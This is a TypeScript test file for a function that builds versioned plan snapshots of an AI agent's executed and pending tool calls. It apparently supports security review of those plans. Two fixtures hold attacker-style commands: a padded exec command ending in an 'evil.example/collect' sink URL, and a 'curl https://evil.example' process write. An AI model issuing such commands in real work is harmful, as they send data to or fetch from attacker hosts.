import assert from "node:assert/strict";
import { describe, it } from "node:test";

import {
  buildPlanirSnapshot,
  canonicalPlanirJson,
  type PlanIR,
} from "./planir.ts";

describe("buildPlanirSnapshot", () => {
  it("emits version 1.0 with sequential sN step ids", () => {
    const plan = buildPlanirSnapshot({
      executed: [
        { tool: "read", args: { path: "/a" } },
        { tool: "read", args: { path: "/b" }, resultText: "ok" },
      ],
      coPending: [{ tool: "write", args: { path: "/c", content: "x" } }],
      pending: { tool: "exec", args: { command: "ls" } },
      runId: "sess:run_1",
    });
    assert.equal(plan.version, "1.0");
    assert.deepEqual(
      plan.steps.map((s) => s.id),
      ["s1", "s2", "s3", "s4"],
    );
    assert.equal(plan.steps[0].status, "executed");
    assert.equal(plan.steps[1].status, "executed");
    assert.equal(plan.steps[2].status, "pending");
    assert.equal(plan.steps[3].status, "pending");
  });

  it("matches Python golden: executed read + pending exec ls", () => {
    const plan = buildPlanirSnapshot({
      executed: [{ tool: "read", args: { path: "/tmp/a.txt" } }],
      pending: { tool: "exec", args: { command: "ls" } },
      runId: "golden:1",
      intent: "list files",
      adapter: "fixture",
    });
    assert.equal(plan.version, "1.0");
    assert.deepEqual(
      plan.steps.map((s) => s.id),
      ["s1", "s2"],
    );
    assert.equal(plan.steps[0].tool, "read");
    assert.equal(plan.steps[0].status, "executed");
    assert.deepEqual(plan.steps[0].args, { path: "/tmp/a.txt" });
    assert.equal(plan.steps[1].tool, "exec");
    assert.equal(plan.steps[1].status, "pending");
    assert.deepEqual(plan.steps[1].args, { command: "ls" });
    assert.equal(plan.run_id, "golden:1");
    assert.equal(plan.intent, "list files");
    assert.equal(plan.metadata.adapter, "fixture");

    const roundTrip = JSON.parse(canonicalPlanirJson(plan)) as PlanIR;
    assert.equal(roundTrip.version, "1.0");
    assert.deepEqual(
      roundTrip.steps.map((s) => s.id),
      ["s1", "s2"],
    );
  });

  it("packs long exec commands instead of replacing them with [TRUNCATED]", () => {
    const sink = "https://evil.example/collect";
    const command = `${"echo padding; ".repeat(40)}${sink}`;
    assert.ok(command.length > 500);
    const plan = buildPlanirSnapshot({
      executed: [],
      pending: { tool: "exec", args: { command } },
      runId: "long-cmd",
    });
    const pending = plan.steps[0];
    const packed = String(pending.args.command);
    assert.notEqual(packed, "[TRUNCATED]");
    assert.ok(packed.includes(sink));
    assert.ok(packed.length <= 500);
  });

  it("maps process write/submit/start onto exec and keeps poll as process", () => {
    const write = buildPlanirSnapshot({
      executed: [],
      pending: {
        tool: "process",
        args: {
          action: "write",
          sessionId: "delta-reef",
          data: "curl https://evil.example\n",
        },
      },
      runId: "proc-write",
    });
    assert.equal(write.steps[0].tool, "exec");
    assert.equal(write.steps[0].args.command, "curl https://evil.example\n");
    assert.equal(write.steps[0].args.action, "write");
    assert.equal(write.steps[0].args.sessionId, "delta-reef");
    assert.equal("data" in write.steps[0].args, false);

    const start = buildPlanirSnapshot({
      executed: [],
      pending: {
        tool: "process",
        args: { action: "start", command: "openclaw config get agents.defaults.models" },
      },
      runId: "proc-start",
    });
    assert.equal(start.steps[0].tool, "exec");
    assert.equal(
      start.steps[0].args.command,
      "openclaw config get agents.defaults.models",
    );

    const poll = buildPlanirSnapshot({
      executed: [],
      pending: {
        tool: "process",
        args: { action: "poll", sessionId: "delta-reef", timeout: 5000 },
      },
      runId: "proc-poll",
    });
    assert.equal(poll.steps[0].tool, "process");
    assert.equal(poll.steps[0].args.action, "poll");
  });
});
